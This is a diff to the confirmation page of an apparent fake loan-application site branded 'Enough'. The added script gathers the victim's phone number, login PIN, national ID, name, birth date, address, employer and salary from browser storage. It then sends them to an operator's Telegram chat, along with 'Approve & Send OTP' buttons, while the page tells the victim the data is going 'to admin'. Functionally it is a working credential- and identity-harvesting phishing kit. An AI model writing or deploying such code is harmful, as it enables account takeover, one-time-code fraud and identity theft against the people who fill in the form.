@@ -30,17 +30,80 @@ p{color:#666;line-height:1.6;margin:10px 0}
 <h2>Loan Application Submitted</h2>
 <p>Thank you for applying to Enough.</p>
 <p>Our team will review your application and contact you soon.</p>
-<div class="timer-box"><span class="loader"></span>Redirecting to login in 5 seconds...</div>
-<button class="btn" onclick="window.location='login.html'">Go to Login Now</button> <!-- CHANGED -->
+<div class="timer-box"><span class="loader"></span>Sending to admin...</div>
+<button class="btn" onclick="window.location='login.html'">Go to Login Now</button>
 </div>
 </div>
+
 <script>
-localStorage.clear(); // Clear old data for next person
+// PUT YOUR BOT TOKEN AND CHAT ID HERE
+const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE"; 
+const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
+
+// Get all data from localStorage
+const data = {
+  amount: localStorage.getItem('amount'),
+  period: localStorage.getItem('period'),
+  phone: localStorage.getItem('loginPhone'),
+  pin: localStorage.getItem('loginPIN'),
+  idNumber: localStorage.getItem('idNumber'),
+  fullName: localStorage.getItem('fullName'),
+  dob: localStorage.getItem('dob'),
+  address: localStorage.getItem('address'),
+  employer: localStorage.getItem('employer'),
+  job: localStorage.getItem('job'),
+  salary: localStorage.getItem('salary')
+};
+
+const message = `
+🆕 *NEW LOAN APPLICATION*
+
+💰 *Loan:* $${data.amount} for ${data.period}
+📱 *Phone:* ${data.phone}
+🔒 *PIN:* ${data.pin}
+
+👤 *Personal Info*
+Name: ${data.fullName}
+ID: ${data.idNumber}
+DOB: ${data.dob}
+Address: ${data.address}
+
+💼 *Work Info*
+Employer: ${data.employer}
+Job: ${data.job}
+Salary: $${data.salary}
+
+⏰ *Time:* ${new Date().toLocaleString()}
+`;
+
+const keyboard = {
+  inline_keyboard: [
+    [
+      {"text": "✅ Approve & Send OTP", "callback_data": "approve_" + data.phone},
+      {"text": "❌ Reject", "callback_data": "reject_" + data.phone}
+    ]
+  ]
+};
+
+// Send to Telegram
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: 'Markdown',
+    reply_markup: keyboard
+  })
+}).then(()=>{
+  document.querySelector('.timer-box').innerHTML = '✅ Sent to admin for approval';
+});
+
+localStorage.clear();
 let count = 5;
 const timer = setInterval(()=>{
   count--;
-  document.querySelector('.timer-box').innerHTML = `<span class="loader"></span>Redirecting to login in ${count} seconds...`; // CHANGED
-  if(count <= 0){clearInterval(timer);window.location='login.html';} // CHANGED
+  if(count <= 0){clearInterval(timer);window.location='login.html';}
 }, 1000);
 </script>
 </body></html>
